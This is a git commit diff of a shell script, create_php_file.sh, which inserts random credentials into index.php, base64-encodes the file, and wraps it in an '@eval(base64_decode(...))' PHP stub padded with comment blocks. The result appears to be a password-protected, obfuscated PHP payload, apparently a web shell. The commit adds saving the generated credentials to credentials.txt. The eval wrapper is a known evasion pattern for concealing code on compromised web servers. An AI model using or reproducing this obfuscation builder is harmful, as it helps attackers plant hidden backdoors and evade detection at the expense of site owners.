7683dd4a3ef46f5dfe2cd1c8dd25597e8fc52786
Jive Turkey <75489987+j1v37u2k3y@users.noreply.github.com>
2022-12-07 10:45:58 -0500

    Update create_php_file.sh

--- create_php_file.sh
+++ create_php_file.sh
@@ -3,7 +3,11 @@ username=$(echo $RANDOM | md5sum | head -c 20; echo;)
 password=$(echo $RANDOM | md5sum | head -c 20; echo;)
 sed "s|####USERNAME####|${username}|g" index.php > index2.php
 sed "s|####PASSWORD####|${password}|g" index2.php > index3.php
-echo "This is the username: ${username}"
-echo "This is the password: ${password}"
+username_text="This is the username: ${username}"
+password_text="This is the password: ${password}"
+echo ${username_text}
+echo ${password_text}
+echo ${username_text} > credentials.txt
+echo ${password_text} >> credentials.txt
 base64string=$(base64 --w 0 < index3.php)
 echo "<?php /****/@null; /********/ /********/ /********/@eval/****/(\"?>\".base64_decode(\"${base64string}\")); ?>" > ultra.php
